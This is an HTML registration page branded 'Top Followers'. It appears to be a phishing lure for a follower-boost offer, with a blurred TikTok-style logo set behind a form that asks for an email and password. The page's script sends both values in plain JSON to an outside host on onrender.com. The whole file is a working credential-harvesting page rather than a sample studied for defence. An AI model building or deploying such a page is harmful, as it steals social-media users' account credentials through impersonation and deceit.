<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register for Top Follows</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            overflow: hidden; /* Hide overflow from the large logo */
            position: relative;
        }

        .tiktok-logo-background {
            background: url("./img.png");
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100vw;
            height: 100vh;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center center;
            position: absolute;
            font-size: 0;
            z-index: 0;
            pointer-events: none;
            filter: blur(5px);
        }

        /* Responsive: On small screens, use cover for better fit */
        @media (max-width: 600px) {
            .tiktok-logo-background {
                filter: blur(5px);
                background-size: cover;
                filter: blur(3px);
            }
        }

        .container {
            background: rgba(206, 207, 204, 0.2); /* More glassy, semi-transparent */
            backdrop-filter: blur(10px); /* Frosted glass effect */
            -webkit-backdrop-filter: blur(10px); /* Safari support */
            border: 1px solid rgba(255, 255, 255, 0.3); /* Subtle border for glass look */
            padding: 40px;
            border-radius: 8px;
            color: black;
            box-shadow: 0 4px 10px rgba(226, 221, 221, 0.774);
            text-align: center;
            z-index: 1; /* Ensure container is above the logo */
            position: relative;
        }

        h1 {
            color: #13cda185;;
            margin-bottom: 30px;
            font-size: 2.5em;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #eeeeee;
            font-weight: bold;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #f7f7f7;
            background-color: rgba(255, 0, 0, 0.016);
            color: white;
            border-radius: 5px;
            box-sizing: border-box; /* Include padding in width */
            font-size: 1em;
        }

        button {
            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 1.1em;
            cursor: pointer;
            transition: transform 0.2s ease-in-out;
        }

        button:hover {
            transform: translateY(-2px);
        }

        .message {
            margin-top: 20px;
            color: #af4c4c;
            font-weight: bold;
        }

        .password-input-container {
            position: relative;
        }

        .password-input-container input {
            padding-right: 40px; /* Make space for the icon */
        }

        .password-input-container .fa-eye,
        .password-input-container .fa-eye-slash { /* For both eye and eye-slash icons */
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #888; /* Adjust color as needed */
        }
    </style>
</head>
<body>
    <div class="tiktok-logo-background"></div>

    <div class="container">
        <h1>Top Followers</h1>
        <form id="registrationForm">
            <div class="input-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <div class="password-input-container">
                    <input type="password" id="password" name="password" required>
                    <i class="fas fa-eye" id="togglePassword"></i>
                </div>
            </div>

            <button type="submit">Register</button>
        </form>
        <p class="message" id="registrationMessage" style="display: none;"></p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const registrationMessage = document.getElementById('registrationMessage');
            const togglePassword = document.getElementById('togglePassword');

            // Function to hide the message
            function hideMessage() {
                registrationMessage.style.display = 'none';
                registrationMessage.textContent = ''; // Clear the text as well
            }

            // Add event listeners to input fields to hide the message on keyup
            emailInput.addEventListener('keyup', hideMessage);
            passwordInput.addEventListener('keyup', hideMessage);

            // Form submission logic
            document.getElementById('registrationForm').addEventListener('submit', async function(event) {
                event.preventDefault();

                const email = emailInput.value;
                const password = passwordInput.value;

                try {
                    const response = await fetch('https://top-follower.onrender.com', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ email, password })
                    });

                    const data = await response.json(); // Always parse JSON to get the message

                    if (response.ok) {
                        registrationMessage.style.color = 'red'; // Green for success
                        registrationMessage.textContent = data.message || 'Operation successful!'; // Display message from server
                        emailInput.value = '';
                        passwordInput.value = '';
                    } else {
                        registrationMessage.style.color = 'yellow'; // Red for error
                        registrationMessage.textContent = data.message || 'An error occurred during operation.'; // Display error message from server
                    }
                } catch (error) {
                    console.error('Error during registration:', error);
                    registrationMessage.style.color = '#af4c4c';
                    registrationMessage.textContent = 'Network error or server unavailable.';
                }

                registrationMessage.style.display = 'block'; // Always show message after form submission
            });

            // Password toggle logic
            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.classList.toggle('fa-eye');
                this.classList.toggle('fa-eye-slash');
            });
        });
    </script>
</body>
</html>
